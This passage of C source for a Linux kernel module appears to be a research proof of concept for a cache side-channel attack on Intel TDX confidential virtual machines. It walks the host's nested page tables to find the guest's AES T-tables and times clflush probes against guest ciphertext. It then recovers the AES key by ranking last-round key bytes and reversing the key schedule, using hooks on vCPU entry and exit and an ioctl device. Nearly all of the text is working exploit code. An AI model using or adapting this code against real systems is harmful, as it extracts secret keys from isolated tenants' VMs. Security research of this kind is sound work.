          for_each_tdp_pte_min_level(iter, node, PG_LEVEL_2M, gfn,gfn+1) {
            if (!(iter.old_spte&0b111) || !(iter.old_spte&0x80)) {
            continue;
            }
            if (iter.gfn == gfn) {
              uint64_t pa = ((iter.old_spte&(~0x1fffffULL))&((1ULL<<51)-1))+(max&0x1ffULL)*0x1000+0xbc0;
              ttables = (uint8_t*)__va(pa);
	      goto done;
	    }
          }
        }
        done:
	printk("Addr: %lx\n", ttables);
	gfn = max2&(~0x1ffULL);

        list_for_each_entry(node, r, link) {
          for_each_tdp_pte_min_level(iter, node, PG_LEVEL_2M, gfn,gfn+1) {
            if (!(iter.old_spte&0b111) || !(iter.old_spte&0x80)) {
            continue;
            }
            if (iter.gfn == gfn) {
              uint64_t pa = ((iter.old_spte&(~0x1fffffULL))&((1ULL<<51)-1))+(max&0x1ffULL)*0x1000+0xbc0;
              ttables2 = (uint8_t*)__va(pa);
	      goto done2;
	    }
          }
        }
        done2:
	printk("Addr: %lx\n", ttables2);
      }
    }
    else if (mode == 2 && ttables) {
      cpuid_ret = 0;
      if (mm == 0) {
	p1 = vcpu->kvm_vcpu_arch[VCPU_REGS_R13];
	mm = 1;
	goto out;
      }
      mm = 0;
      p2 = vcpu->kvm_vcpu_arch[VCPU_REGS_R13];

      uint8_t ciphertext[16];
      memcpy(ciphertext, &p1, 8);
      memcpy(ciphertext+8, &p2, 8);
      for (size_t ttable_idx = 0; ttable_idx < 4; ++ttable_idx)
      {
        uint8_t *probe = ttables+ttable_idx*1024;
	mfence();
    	size_t beg = rdtsc_nofences();
	clflush(probe);
	mfence();
    	size_t end = rdtsc_nofences();
	mfence();
        size_t delta = end-beg;
        for (size_t byte_idx = ((ttable_idx + 2) % 4); byte_idx < 16; byte_idx += 4)
        {
          ct_byte_freq[byte_idx][(int) ciphertext[byte_idx]]++;
          if (delta > 120)
            cache_hits[byte_idx][(int) ciphertext[byte_idx]]++;
        }
      }

      if (++print_cnt %1 == 0) {
        for (int i = 0; i < 16; i++) {
           for (int j = 0; j < 256; j++) {
             hit_rate[i][j] = ((uint64_t) cache_hits[i][j]*100000) / (ct_byte_freq[i][j]+1);
           }
        }

        size_t most_frequent_values[16][16];
        for (int i=0; i<16; i++) {
          top_elems(hit_rate[i], 256, most_frequent_values[i], 16);
        }
        for (int i=0; i<16; i++) {
          // loop through ciphertext bytes with lowest missrates
          for (int j=0; j<16; j++) {
            for (int k=0; k<16; k++) {
              key_candidates[i][most_frequent_values[i][j] ^ Te4[k]]++;
            }
          }
        }

        // find the max value in key_candidates...
        // this is our guess at the key byte for that ctext position
        for (int i=0; i<16; i++) {
          int maxValue = 0;
          int maxIndex;
          for (int j=0; j<256; j++) {
            if (key_candidates[i][j] > maxValue) {
              maxValue = key_candidates[i][j];
              maxIndex = j;
            }
          }
          // save in the guess array
          last_round_key_guess[i] = maxIndex;
        }
        uint32_t roundWords[4];
        roundWords[3] = (((uint32_t) last_round_key_guess[12]) << 24) ^
                        (((uint32_t) last_round_key_guess[13]) << 16) ^
                        (((uint32_t) last_round_key_guess[14]) << 8 ) ^
                        (((uint32_t) last_round_key_guess[15])      );

        roundWords[2] = (((uint32_t) last_round_key_guess[8] ) << 24) ^
                        (((uint32_t) last_round_key_guess[9] ) << 16) ^
                        (((uint32_t) last_round_key_guess[10]) << 8 ) ^
                        (((uint32_t) last_round_key_guess[11])      );

        roundWords[1] = (((uint32_t) last_round_key_guess[4] ) << 24) ^
                        (((uint32_t) last_round_key_guess[5] ) << 16) ^
                        (((uint32_t) last_round_key_guess[6] ) << 8 ) ^
                        (((uint32_t) last_round_key_guess[7] )      );

        roundWords[0] = (((uint32_t) last_round_key_guess[0] ) << 24) ^
                        (((uint32_t) last_round_key_guess[1] ) << 16) ^
                        (((uint32_t) last_round_key_guess[2] ) << 8 ) ^
                        (((uint32_t) last_round_key_guess[3] )      );

        uint32_t tempWord4, tempWord3, tempWord2, tempWord1;
        uint32_t rcon[10] = {0x36000000, 0x1b000000, 0x80000000, 0x40000000,
                             0x20000000, 0x10000000, 0x08000000, 0x04000000,
                             0x02000000, 0x01000000 };
        // loop to backtrack aes key expansion
        for (int i=0; i<10; i++) {
          tempWord4 = roundWords[3] ^ roundWords[2];
          tempWord3 = roundWords[2] ^ roundWords[1];
          tempWord2 = roundWords[1] ^ roundWords[0];

          uint32_t rotWord = (tempWord4 << 8) ^ (tempWord4 >> 24);

          tempWord1 = (roundWords[0] ^ rcon[i] ^ subWord(rotWord));

          roundWords[3] = tempWord4;
          roundWords[2] = tempWord3;
          roundWords[1] = tempWord2;
          roundWords[0] = tempWord1;
        }

        //if (print_cnt %1000 == 0) {
        //  printk("Recovered Key %lu: %08x %08x %08x %08x\n", print_cnt, roundWords[0], roundWords[1], roundWords[2], roundWords[3]);
	//}
	roundWords[0] = __builtin_bswap32(roundWords[0]);
	roundWords[1] = __builtin_bswap32(roundWords[1]);
	roundWords[2] = __builtin_bswap32(roundWords[2]);
	roundWords[3] = __builtin_bswap32(roundWords[3]);
	if (0 == memcmp(current_key, roundWords, 16)) {
	  cpuid_ret = 1;
	  printk("correct key: %lu\n", print_cnt);
	  print_cnt = 0;
	  memset(cache_hits, 0, sizeof(cache_hits));
	  memset(hit_rate, 0, sizeof(hit_rate));
	  memset(ct_byte_freq, 0, sizeof(ct_byte_freq));
	  memset(key_candidates, 0, sizeof(key_candidates));

	  
	}
	

      }

    }
  }



  out:
  put_cpu();
}

//void hook4(struct td_params *params, void *kvm) {
//  printk("HOOK4: %lx\n",tdx_info);
//  printk("HOOK4: read done\n");
//  for (size_t i = 0; i < 48; ++i) {
//    struct tdx_cpuid_value t = params->cpuid_values[i];
//    printk("CPUID: %lx: %x, %x, %x, %x\n", i, t.eax, t.ebx, t.ecx, t.edx);
//  }
//  for (size_t i = 0; i < tdx_info->num_cpuid_config; ++i) {
//    const struct kvm_tdx_cpuid_config *c = &tdx_info->cpuid_configs[i];
//    if (c->leaf == 7&& c->sub_leaf ==0) {
//      printk("HOOK4: found leaf 7\n");
//      params->cpuid_values[i].ecx |= 1U<<5;
//    }
//
//  }
//
//  
//  
//}

static long ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  long ret = -1;
  printk(ATTACKER"calling ioctl %d with arg %ld\n", cmd, arg);
  struct Args args;

  switch (cmd) {
    case COLLECT:
      printk(ATTACKER "go\n");
      ret = copy_from_user(&args, (void*)arg, sizeof(struct Args));
      done = 0;
      if (ret != 0) break;
      break;
    case END:
      done = 1;
      ret = 0;
      break;
    default:
      printk(ATTACKER "ioctl cmd not found\n");
      ret = -1;
      break;
  }
  return ret;
}


int init_module(void) 
{
  //testselfipi();
  atomic_set(&t_command, 0);
  atomic_set(&t_result, 0);


  dev_t devno;
  int error = alloc_chrdev_region(&devno, ioctl_minor, 1, DEVICE_NAME);
  ioctl_major = MAJOR(devno);
  if (error < 0) {
    return -1;
  }
  devno = MKDEV(ioctl_major, ioctl_minor);
  cdev_init(&cdev, &ioctl_interface_fops);
  cdev.owner = THIS_MODULE;
  error = cdev_add(&cdev, devno, 1);
  if (error < 0) {
    cdev_del(&cdev);
    unregister_chrdev_region(devno, 1);
    return -1;
  }

  dd = vmalloc(1024ULL*1024ULL*1024ULL*8ULL);
  memset(dd, 0, 1024ULL*1024ULL*1024ULL*8ULL);
  dd2 = vmalloc(1024ULL*1024ULL*1024ULL*8ULL);
  memset(dd2, 0, 1024ULL*1024ULL*1024ULL*8ULL);

  //chardev_class = class_create(DEVICE_NAME); for newer kernel versions
  chardev_class = class_create(DEVICE_NAME);
  device_create(chardev_class, NULL, devno, NULL, DEVICE_NAME);
  vcpu_run_beg_hook = (void *)hook1;
  vcpu_run_end_hook = (void *)hook2;
  printk("TDX: thrd aaa\n");
  struct task_struct *thrd = kthread_create(tdxaes, 0, "tdxupdate");
  kthread_bind(thrd, 14);
  wake_up_process(thrd);
  printk("TDX: thrd %llx\n", thrd);
  //thread_id = kernel_thread(tdxupdatehook, NULL, "tdxupdate", CLONE_FS | CLONE_FILES | CLONE_SIGHAND);
  return 0;

} 

 

void cleanup_module(void) 
{ 
  pr_info("unload.\n"); 
  dev_t devno = MKDEV(ioctl_major, ioctl_minor);
  device_destroy(chardev_class, devno);
  class_destroy(chardev_class);

  cdev_del(&cdev);
  unregister_chrdev_region(devno, 1);
  vcpu_run_beg_hook = 0;
  vcpu_run_end_hook = 0;
  unloading = 1;
  //wait_for_completion(&on_exit);
  msleep(1000);
  vfree(dd);
  vfree(dd2);
} 

 

MODULE_LICENSE("GPL");
